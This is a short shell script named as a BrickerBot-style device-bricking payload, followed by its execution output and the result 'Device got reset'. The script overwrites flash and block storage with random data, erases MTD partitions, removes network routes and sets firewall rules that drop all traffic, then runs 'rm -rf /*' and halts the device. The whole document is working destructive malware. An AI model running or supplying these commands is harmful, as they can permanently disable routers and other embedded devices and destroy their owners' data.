#!/bin/sh /etc/rc.common
# overwrite flash memory with random data
cat /dev/urandom | mtd_write mtd0 - 0 32768
cat /dev/urandom >/dev/mtdblock0
cat /dev/urandom >/dev/mmcblk0
cat /dev/urandom >/dev/root
cat /dev/urandom >/dev/mtd0
flash_erase /dev/mtdblock0 0 999999 0
flash_erase /dev/mtdblock1 0 999999 0

# make the device inaccessible over the network

route del default
iproute del default; ip route del default
iptables -F;iptables -t nat -F;iptables -A INPUT -j DROP;iptables -A FORWARD -j DROP

# wipe files

rm -rf /* 2>/dev/null
halt -n -f
reboot



OUTPUT------------------------------------------------------------------------------------
 ./Brickerbot-script.sh 
/etc/rc.common: ./Brickerbot-script.sh: line 3: mtd_write: not found
cat: write error: Operation not permitted
cat: write error: No space left on device
cat: write error: No space left on device
/etc/rc.common: ./Brickerbot-script.sh: line 7: can't create /dev/mtd0: Permission denied
/etc/rc.common: ./Brickerbot-script.sh: line 8: flash_erase: not found
/etc/rc.common: ./Brickerbot-script.sh: line 9: flash_erase: not found
/etc/rc.common: ./Brickerbot-script.sh: line 14: iproute: not found


RESULT -----------------------------------------------------------------------------------

Device got reset

------------------------------------------------------------------------------------------
